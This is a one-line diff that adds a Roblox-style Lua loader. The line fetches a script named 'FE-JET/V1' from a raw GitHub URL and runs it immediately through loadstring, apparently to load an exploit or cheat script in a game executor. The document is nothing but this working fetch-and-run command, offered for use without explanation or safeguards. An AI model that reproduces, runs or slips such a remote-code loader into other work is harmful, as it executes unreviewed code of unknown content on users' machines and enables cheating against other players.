@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PYXDYT/FE-JET/main/V1'))()
